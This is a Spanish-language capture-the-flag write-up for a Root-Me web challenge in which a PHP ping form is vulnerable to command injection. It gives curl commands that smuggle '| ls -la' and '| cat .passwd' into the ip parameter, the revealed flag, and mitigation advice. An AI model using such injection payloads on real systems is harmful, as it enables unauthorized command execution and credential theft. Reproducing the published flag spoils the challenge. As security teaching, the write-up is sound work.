1. 📝 Descripción
El reto presenta un servicio de red simple que permite a los usuarios realizar un "Ping" a una dirección IP. El objetivo es explotar la falta de saneamiento en la entrada del usuario para ejecutar comandos arbitrarios en el servidor y leer archivos restringidos.

2. 🔍 Fase de Reconocimiento
Al interactuar con el formulario, observamos que los datos se envían mediante una petición POST con el parámetro ip. La salida del comando se muestra directamente dentro de etiquetas <pre> en el HTML.

Supusimos que el código interno de PHP utiliza una función similar a:

PHP

shell_exec("ping -c 3 " . $_POST['ip']);
3. 🛠️ Análisis de la Vulnerabilidad
Intentamos inyectar comandos utilizando diferentes delimitadores.

El uso de ; falló inicialmente (posiblemente filtrado o escapado).

El uso de | (pipe) resultó exitoso. El "pipe" toma la salida del primer comando y la pasa al segundo, pero en este contexto, permite encadenar la ejecución.

Verificación de Archivos
Ejecutamos ls -la para listar el directorio actual:

Bash

curl -X POST -d "ip=127.0.0.1 | ls -la" "http://challenge01.root-me.org/web-serveur/ch54/index.php"
Resultado relevante:

Plaintext

-r--r-----  1 web-serveur-ch54 www-data    23 Dec 10  2021 .passwd
Identificamos un archivo oculto llamado .passwd que probablemente contiene la credencial necesaria.

4. 🚀 Explotación
Para obtener el flag, utilizamos el comando cat para leer el contenido del archivo .passwd:

Bash

curl -X POST -d "ip=127.0.0.1 | cat .passwd" "http://challenge01.root-me.org/web-serveur/ch54/index.php"
Respuesta del servidor:

Plaintext

<pre>
S3rv1ceP1n9Sup3rS3cure
</pre>


5. 🚩 Resultado
Flag: S3rv1ceP1n9Sup3rS3cure

6. 🛡️ Mitigación
Para prevenir la inyección de comandos en PHP, se deben seguir estas prácticas:

Evitar funciones de ejecución directa: No usar system(), exec(), o shell_exec() con entrada del usuario si existen alternativas nativas (ej. filter_var() para validar IPs).

Validación Estricta: Implementar una expresión regular o funciones de validación de red para asegurar que la entrada sea únicamente una dirección IP válida.

Escapado de Argumentos: Si es estrictamente necesario usar la shell, emplear escapeshellarg() o escapeshellcmd() para neutralizar caracteres especiales como ;, |, &, y $.
